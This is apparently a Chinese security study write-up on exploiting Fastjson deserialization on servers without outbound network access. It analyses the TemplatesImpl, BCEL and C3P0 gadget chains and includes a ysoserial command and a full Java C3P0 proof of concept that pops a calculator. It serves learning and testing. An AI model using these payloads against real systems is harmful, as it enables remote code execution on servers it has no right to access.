    Fastjson不出网利用 #

    前言 #

    Fastjson 是面试时非常经典、面试官也非常喜欢问的一环，而除了 Fastjson 的基本利用之外也有面对服务端不出网的情况，这种情况在红队之类的面试也很经常会问的，所以在这里记录一下常见了利用手法以及链子。

    不出网 #

    不出网指的是目标服务器无法主动向攻击者控制的外部服务器发起网络请求，大致可以分为完全不出网和不完全出网。完全不出网就是目标服务器完全无法向外部发起网络连接，不管什么协议都不行；而不完全出网就是少数协议被限制无法发起网络连接，或者仅限目标服务器能通过少数协议向外部发起网络连接。比如服务器限制了不能向外部建立 LDAP 连接，但是 ICMP 协议能出网。

    而在 Fastjson 的场景下，如果目标服务器不出网，那么我们最经典的 JNDI 注入的攻击方式就无法实现。而不出网利用的核心思路，就是把恶意 payload 直接放到 Fastjson 的 JSON 数据中，让目标在本地解析、加载并执行，全程不需要它主动对外建立连接。

    利用方式 #

    TemplatesImpl 利用链 #

    之前学习 CC 链和 Fastjson 1.2.24 版本的利用时都涉及到这条利用链了，所以这里也不记录具体的利用链，直接上 POC。

    本地就用 Fastjson 1.2.24 版本进行复现，这个版本的利用更加简单。

    但是这种利用的条件比较严格：

    1. 服务端使用parseObject()时，需要使用JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);
    2. 服务端使用parse()时，需要使用JSON.parse(text1,Feature.SupportNonPublicField)

    使用 base64 来传输是因为底层 Fastjson 会调用IOUtils.decodeBase64()来进行解码，而如果直接传 class 文件的内容会破坏 JSON 的格式，Fastjson 也无法正确解析出字节数组。

    BCEL 利用链 #

    这种利用方式是 Fastjson 最经典也最好用的一种方法。

    BCEL 简介 #

    BCEL 即 Apache Commons BCEL 字节码工程库，它是一个用来分析、创建和操作 Java 的 class 文件的工具库。BCEL 其实就是和 ASM、Javassist 还有 ByteBuddy 一样的字节码操作工具，只不过各个工具的工作层面不同。 BCEL 工作在 JVM 指令层面，我们可以操作每一条 JVM 指令。

    利用 #

    BCEL 对应的包在老版本 JDK 中是内置的，直到 JDK8u251 之后这个包才被删除了。所以在实战中如果目标服务器的 JDK 版本较低是比较好利用的，到高版本除非目标导入了 BCEL 的依赖，否则无法利用。

    BCEL ClassLoader 有一个特殊能力：能够识别$$BCEL$$开头的字符串，把后面的内容解码成字节码直接加载，整个过程是在本地完成的，不需要任何网络连接。

    实际在利用的时候是需要目标导入了 tomcat 的相关依赖的：

    <dependency>
	<groupId>org.apache.tomcat</groupId>
	<artifactId>tomcat-dbcp</artifactId>
	<version>9.0.20</version>
</dependency>

    先对 POC 的字节码转化为 BCEL：

    利用链分析 #

    Fastjson 的一些重要的小特性 #

    在调试分析之前，需要先了解一些关于 Fastjson 的一些小特性。

    Fastjson 中的parse()和parseObject()都可以用来将 JSON 字符串反序列化成 Java 对象，parseObject()本质上也是调用parse()进行反序列化的，但是parseObject()会额外地将 Java 对象转化为JSONObject对象，即调用JSON.toJSON。所以反序列化时的区别就在于，parse()会识别并调用目标类的setter和某些符合条件的getter方法，而parseObject()由于多执行了JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有setter和getter。

    而黑盒的情况下我们也不知道后端调用的到底是parse()还是parseObject()，所以我们需要找到一种能同时兼容这两个方法的办法，也就要找到一种方法让其可以在反序列化的过程中调用到JSON.toString()。

    为什么需要找JSON.toString()？实际上真正想要利用的是JSONObject.toString()，JSONObject中其实并没有实现toString()方法，但是它继承了JSON类，也继承了toString()方法，而JSON.toString()方法中则调用了toJSONString()，也就是序列化的过程，而序列化的过程本质上就是遍历对象的所有getter来提取属性值。

    这就意味着：只要我们能在反序列化的过程中，让 Fastjson 对一个包含了恶意对象的JSONObject调用toString()，我们就可以利用某些getter来进行一些操作了。

    POC 分析 #

    我们针对这个 POC 来分析。

    首先看我们需要的进行反序列化的类org.apache.tomcat.dbcp.dbcp2.BasicDataSource，找到driverClassLoader和driverClassName对应的setter或者getter。

    public synchronized void setDriverClassLoader(final ClassLoader driverClassLoader) {
    this.driverClassLoader = driverClassLoader;
}

    public synchronized void setDriverClassName(final String driverClassName) {
    if (driverClassName != null && driverClassName.trim().length() > 0) {
        this.driverClassName = driverClassName;
    } else {
        this.driverClassName = null;
    }
}

    先看一下setDriverClassLoader方法，方法签名中传入的参数是一个类对象，所以我们在反序列化的时候要先用@type来实例化一个类，不然无法正常运行。

    在 POC 中我们传入的参数是com.sun.org.apache.bcel.internal.util.ClassLoader，就会被注入到其中。而我们构造的 BCEL 字节码也会被注入到driverClassName。

    整个攻击分为两个阶段：setter赋值以及getter触发。

    上面的分析就是我们的setter赋值阶段，而getter触发依赖于 Fastjson 的自动扫描机制。

    当 Fastjson 在反序列化完成后，它会寻找符合条件的getter并主动调用。对于parseObject()方法，由于这个方法在反序列化之后会额外执行一步JSON.toJSON()，这个方法会触发目标类的所有getter。

    而parse()方法只会调用一些符合特殊条件的getter。

    注：但是我的 payload 在这里并不是通过 getter 来触发攻击的。

    仔细观察成功的 payload，实际上是一个嵌套的 JSON 作为了 key。如果我用{{...}: "x"}这种写法，不管是使用parse()还是parseObject()，Fastjson 在处理这个 key 的时候都会对它调用toString方法。如果是使用parse()方法，Fastjson 在反序列化时生成了一个JSONObject，而JSONObject放到 JSON 的 key 的位置上时，在 JSON 反序列化的时候，Fastjson 又会对 JSON key 自动调用toString()方法，从而调用getter方法。

    toString()底层会触发序列化逻辑，序列化的过程会遍历并调用目标对象的getter，所以getConnection就是这样被调用出来的。

    C3P0 利用链 #

    简介 #

    C3P0 是一个开源的 JDBC 连接池，它实现了数据源与 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。使用它的开源项目有 Hibernate、Spring 等。

    JDBC 是 Java DataBase Connectivity 的缩写，它是 Java 程序访问数据库的标准接口。

    使用 Java 程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时 Java 在连接数据库时会频繁地创建或者销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可以将其放回连接池中，以便下一次使用。类似这样一种能够复用句柄的技术就是池技术。

    利用 #

    C3P0 首先需要依赖对应的包：

    <dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>
<dependency>
  <groupId>com.mchange</groupId>
  <artifactId>c3p0</artifactId>
  <version>0.9.5.2</version>
</dependency>

    核心依赖还是 C3P0 的包，CommonsCollections 的不是必需，但是相对来说更好用。

    先写一下 POC。

    先用 yso 把 CC2 的 payload 写出来：

    java -jar ysoserial-all.jar CommonsCollections2 "calc" > calc.ser

    再写一个 POC：

    package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.FileInputStream;
import java.io.InputStream;

public class C3P0poc {
    public static void main(String[] args) throws Exception{
        FileInputStream in = new FileInputStream("D:\\tools\\WebTools\\calc.ser");
        byte[] data = toByteArray(in);
        in.close();
        String hexString = bytesToHex(data, data.length);
        String poc = "{\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
        "\"userOverridesAsString\":\"HexAsciiSerializedMap:" + hexString + ";\"}}";

        Object o = JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);
    }

    public static byte[] toByteArray(InputStream in) throws Exception {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHex(byte[] bArray,int length){
        StringBuffer sb = new StringBuffer(length);
        for (int i = 0; i < length; i++) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if(sTemp.length()<2){
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }

        return sb.toString();
    }
}

    能够成功弹出计算器。

    利用链分析 #

    对着这个 payload 进行分析。

    这里反序列化的类是com.mchange.v2.c3p0.WrapperConnectionPoolDataSource，而期望调用的方法是setUserOverridesAsString()，实际上这个方法是WrapperConnectionPoolDataSource这个类的父类WrapperConnectionPoolDataSourceBase实现的，可以看一下源码：

    public synchronized void setUserOverridesAsString( String userOverridesAsString ) throws PropertyVetoException
{
    String oldVal = this.userOverridesAsString;
    if ( ! eqOrBothNull( oldVal, userOverridesAsString ) )
       vcs.fireVetoableChange( "userOverridesAsString", oldVal, userOverridesAsString );
    this.userOverridesAsString = userOverridesAsString;
}

    前面是把解析后的数据给提取出来以及一些赋值，一直到这里：

    跟进去，自动跳到了setUpPropertyListeners()这个方法。

    这里先把我们的 Hex 字符串提取出来，然后还原成字节数组，再进行反序列化，跟进到fromByteArray()方法。

    跟进到deserializeFromByteArray()方法。

{

    很明显了，这里对我们传入的字节数组进行了反序列化，从而执行了我们的恶意代码，触发了 CC2 的链子。

    这种利用方法也叫做二次反序列化，第一次反序列化是 Fastjson 处理 JSON 数据时进行的 JSON 反序列化，然后把我们的恶意字节码传到目标上面，然后又利用 C3P0 来实现 JDK 原生的反序列化利用。

    当然我们也可以利用TemplatesImpl这个利用链来打，这样不需要其他的第三方依赖，但是到高版本的 Fastjson 就无法利用了。

    总结 #

    当然还有其他不出网的利用方式，比如通过commons-io来向目标网站写入 webshell 等，这里就不作学习了，只记录常用的三种利用方式以及对应的利用链的分析。其实总体看下来还是比较简单的，主要思路就是把我们构造好的恶意字节码或者序列化数据放到 payload 中然后发送给目标服务器，让目标服务器加载本地的类来实现攻击。
